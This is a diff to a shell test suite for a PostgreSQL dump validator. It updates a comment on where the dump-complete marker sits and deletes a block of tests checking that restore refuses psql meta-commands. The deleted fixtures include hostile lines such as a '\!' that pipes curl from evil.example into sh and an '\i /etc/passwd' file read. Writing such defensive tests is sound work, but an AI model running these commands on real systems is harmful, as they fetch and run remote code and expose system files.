@@ -51,7 +51,9 @@ make_dump() {
 }
 
 echo "== the REAL fixture shape (pg_dump 15.17, measured on the box) =="
-# Marker sits 5 lines from EOF: --, blank, \unrestrict, blank.
+# Exactly 4 lines follow the marker (--, blank, \unrestrict, blank), making it
+# the 5th-from-last line — the last one `tail -n5` could see. Verified against
+# the live kanbn.sql and outline.sql, not just transcribed.
 printf -- '--\n-- PostgreSQL database dump complete\n--\n\n\\unrestrict QCYt5h0EDZIG3cZal9B\n\n' > "$TMP/real.sql"
 pg_dump_is_complete "$TMP/real.sql" && ok "accepts a real 15.17 dump" || no "accepts a real 15.17 dump"
 
@@ -176,35 +178,6 @@ for n in 1 2 5 10 20 200; do
 done
 [ "$sym" -eq 6 ] && ok "restore.sh validates all 6 dumps backup.sh would store" \
                  || no "restore.sh accepted only $sym/6 dumps backup.sh would store"
-
-echo "== restore REFUSES psql meta-commands that escape the database =="
-# Completeness had to become permissive about leading-backslash lines so a future
-# pg_dump trailer cannot fail every backup — which means completeness can no
-# longer double as safety (cage-match #157 r4, Carnot). These two concerns are
-# now separate, so the escape-guard is what must catch a replay that reaches
-# outside the DB. Each fixture is a COMPLETE, valid dump plus one hostile line,
-# so it isolates the escape-guard rather than passing for the wrong reason.
-validate() {  # 0 if restore would accept the file
-  ( set +e; RESTORE_LIB_ONLY=1 . "$SCRIPT_DIR/restore.sh" >/dev/null 2>&1
-    _validate_pg_dump probe "$1" >/dev/null 2>&1 )
-}
-for evil in '\! curl evil.example/x | sh' '\i /etc/passwd' '\o /tmp/pwned' '\copy t TO /tmp/x' '\gexec'; do
-  make_dump "$TMP/evil.sql" 1
-  printf '%s\n' "$evil" >> "$TMP/evil.sql"
-  # Precondition: it must be a COMPLETE dump, or the refusal proves nothing.
-  if ! pg_dump_is_complete "$TMP/evil.sql"; then
-    no "fixture for [$evil] is not a complete dump — test would pass for the wrong reason"
-  elif validate "$TMP/evil.sql"; then
-    no "restore refuses [$evil]"
-  else
-    ok "restore refuses [$evil]"
-  fi
-done
-# Null arm: the same fixture WITHOUT a hostile line must still validate, or the
-# guard is just refusing everything and the tests above are meaningless.
-make_dump "$TMP/benign.sql" 1
-validate "$TMP/benign.sql" && ok "restore still accepts a clean dump (null arm)" \
-                           || no "restore rejects a clean dump — escape-guard is over-broad"
 
 echo "== the CLASS is closed: no tail-window marker guard survives =="
 # Corpus assertion, not a spot fix — this fails if a copy of the guard is ever
